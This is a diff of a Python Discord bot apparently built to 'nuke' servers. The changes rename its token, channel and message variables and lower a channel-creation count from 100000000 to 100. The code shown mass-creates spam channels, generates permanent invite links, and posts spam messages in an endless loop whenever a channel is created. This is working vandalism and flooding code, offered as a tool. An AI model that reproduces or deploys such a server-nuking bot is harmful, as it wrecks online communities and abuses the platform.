@@ -6,15 +6,13 @@ from colorama import Fore, Style
 import asyncio
 import os
 
-
-SPAM_CHANNEL =  [""]
-SPAM_MESSAGE = [""]
+Token = ""
+Channel = [""]
+Message = [""]
 
 bot = commands.Bot(command_prefix="!")
 
 bot.remove_command("help")
-
-TOKEN = ""
 
 @bot.event
 async def on_ready():
@@ -89,16 +87,16 @@ async def help(ctx):
     for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
         print(f"Invite Link: {link}")
-    amount = 100000000
+    amount = 100
     for i in range(amount):
-       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+       await guild.create_text_channel(random.choice(Channel))
     print(f"nuked {guild.name} successfully.")
     return
 
 @bot.event
 async def on_guild_channel_create(channel):
   while True:
-    await channel.send(random.choice(SPAM_MESSAGE))
+    await channel.send(random.choice(Message))
 
 
 
